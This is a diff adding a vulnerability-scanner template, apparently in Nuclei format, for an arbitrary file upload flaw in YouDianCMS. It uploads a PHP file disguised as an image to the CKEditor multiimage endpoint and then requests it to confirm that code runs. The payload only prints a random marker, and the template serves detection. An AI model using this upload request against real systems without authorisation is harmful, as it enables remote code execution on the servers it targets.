@@ -1,0 +1,55 @@
+id: youdiancms-image-upload-anyfile-upload
+info:
+  name: YouDianCMS Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_base(16)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2
+
+        --cadc403efc1ad12f5fcce44c172baad2
+        Content-Disposition: form-data; name="files"; filename="c.php"
+        Content-Type: image/jpg
+
+        <?php print("{{t1}}");?>
+        --cadc403efc1ad12f5fcce44c172baad2--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "image/uploads/.*?.php"
+      - type: word
+        words:
+          - '"result":"200"'
+    extractors:
+      - type: regex
+        name: t2
+        group: 1
+        regex:
+          - "image/uploads(?P<t2>.*?).php"
+  - raw:
+      - |
+        GET /Public/image/uploads/{{t2}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
